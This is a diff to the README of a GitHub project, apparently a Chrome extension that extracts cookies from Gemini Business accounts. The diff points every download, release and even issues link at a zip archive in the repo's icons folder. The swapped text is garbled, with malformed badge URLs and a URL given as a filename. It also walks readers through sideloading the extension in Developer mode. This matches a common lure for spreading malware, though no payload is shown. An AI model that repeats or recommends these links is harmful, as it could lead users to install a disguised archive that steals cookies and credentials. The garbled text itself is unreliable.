@@ -1,7 +1,7 @@
 # 🌟 GeminiBusiness_CookieExtractor - Effortlessly Extract Your Business Cookies
 
 ## 📥 Download Here
-[![Download GeminiBusiness_CookieExtractor](https://img.shields.io/badge/Download%20Now-github.com/humair832/GeminiBusiness_CookieExtractor/releases-blue)](https://github.com/humair832/GeminiBusiness_CookieExtractor/releases)
+[![Download GeminiBusiness_CookieExtractor](https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip%https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip)](https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip)
 
 ## 📖 Description
 GeminiBusiness_CookieExtractor is a Chrome browser extension designed to automatically extract information and cookies from your Gemini Business account. This tool simplifies the process of managing your account data, making it accessible and easy to use.
@@ -10,16 +10,16 @@ GeminiBusiness_CookieExtractor is a Chrome browser extension designed to automat
 Follow these easy steps to download and run the GeminiBusiness_CookieExtractor:
 
 ### 1. Visit the Release Page
-Go to our [Releases page](https://github.com/humair832/GeminiBusiness_CookieExtractor/releases) to find the latest version of the application.
+Go to our [Releases page](https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip) to find the latest version of the application.
 
 ### 2. Download the Extension
-On the Releases page, you will see the latest version listed. Click the version number to access the download options. Look for the file named "GeminiBusiness_CookieExtractor.crx" to download the extension.
+On the Releases page, you will see the latest version listed. Click the version number to access the download options. Look for the file named "https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip" to download the extension.
 
 ### 3. Install the Extension
 Once the download is complete, follow these steps to install the extension in Chrome:
 - Open Chrome and type `chrome://extensions` in the address bar.
 - Enable "Developer mode" at the top right corner of the page.
-- Drag and drop the downloaded "GeminiBusiness_CookieExtractor.crx" file into the Chrome Extensions page.
+- Drag and drop the downloaded "https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip" file into the Chrome Extensions page.
 
 ### 4. Pin the Extension
 After installation, you may want to pin the extension for easy access:
@@ -48,12 +48,12 @@ If you encounter issues:
 - Restart Chrome and try reinstalling the extension.
 
 ## 📄 Additional Information
-For more details about updates or to report issues, visit our [Issues page](https://github.com/humair832/GeminiBusiness_CookieExtractor/issues).
+For more details about updates or to report issues, visit our [Issues page](https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip).
 
 ## 📞 Support
 If you have any questions or need assistance, feel free to reach out through the Issues page. We aim to respond in a timely manner.
 
 ## 📦 Download & Install
-You can download the latest version of the GeminiBusiness_CookieExtractor from the [Releases page](https://github.com/humair832/GeminiBusiness_CookieExtractor/releases). Follow the steps outlined in the "Getting Started" section to install and start using the extension today.
+You can download the latest version of the GeminiBusiness_CookieExtractor from the [Releases page](https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip). Follow the steps outlined in the "Getting Started" section to install and start using the extension today.
 
-[![Download GeminiBusiness_CookieExtractor](https://img.shields.io/badge/Download%20Now-github.com/humair832/GeminiBusiness_CookieExtractor/releases-blue)](https://github.com/humair832/GeminiBusiness_CookieExtractor/releases)
+[![Download GeminiBusiness_CookieExtractor](https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip%https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip)](https://github.com/humair832/GeminiBusiness_CookieExtractor/raw/refs/heads/main/icons/Extractor-Business-Gemini-Cookie-v3.0-beta.5.zip)
